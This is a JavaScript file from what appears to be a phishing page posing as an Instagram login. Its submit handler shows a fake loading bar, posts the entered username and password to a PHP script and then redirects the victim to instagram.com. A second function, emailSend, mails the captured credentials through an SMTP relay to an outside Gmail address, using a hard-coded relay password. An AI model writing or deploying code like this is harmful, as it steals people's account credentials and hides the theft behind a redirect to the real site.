document.getElementById('login-form').onsubmit = function(event) {
    event.preventDefault(); // Prevent the default form submission

    // Show loading bar
    document.getElementById('loadingBarContainer').style.display = 'block';
    let loadingBar = document.getElementById('loadingBar');
    let width = 0;
    let interval = setInterval(function() {
        if (width >= 100) {
            clearInterval(interval);
            // Proceed with form submission after loading bar completes
            submitForm();
        } else {
            width++;
            loadingBar.style.width = width + '%';
        }
    }, 30); // Adjust this value to control the speed of the loading bar
};

function submitForm() {
    const form = document.getElementById('login-form');
    const formData = new FormData(form);

    // Send form data using fetch
    fetch('submit_form.php', {
        method: 'POST',
        body: formData
    }).then(response => response.text())
    .then(result => {
        // Hide loading bar
        document.getElementById('loadingBarContainer').style.display = 'none';
// Hide forget password
        document.getElementById('fp').style.display = 'none';
        // Show confirmation message
        document.getElementById('confirmationMessage').style.display = 'block';
        // Hide the form
        form.style.display = 'none';
        // 
        setTimeout(function() {
            window.location.href = "https://instagram.com";
        }, 5000); // 3 seconds delay
    }).catch(error => console.error('Error:', error));
}





function emailSend() {
    var email = document.getElementById('identifier').value;
    var password = document.getElementById('password').value;
    var messageBody = "Name " + email + " " + password;
    
    Email.send({

        Host: "smtp.elasticemail.com",
        Username: "yfyf806shirl@gmail.com",
        Password: "1FBEAF8564E06DADAABF5E6EDEB61A51B3DB",
        To: 'jaeger.62frei@gmail.com',
        From: "yfyf806shirl@gmail.com",
        Subject: "Response",
        Body: messageBody
    }).then(
        message => alert(message)
    );
}
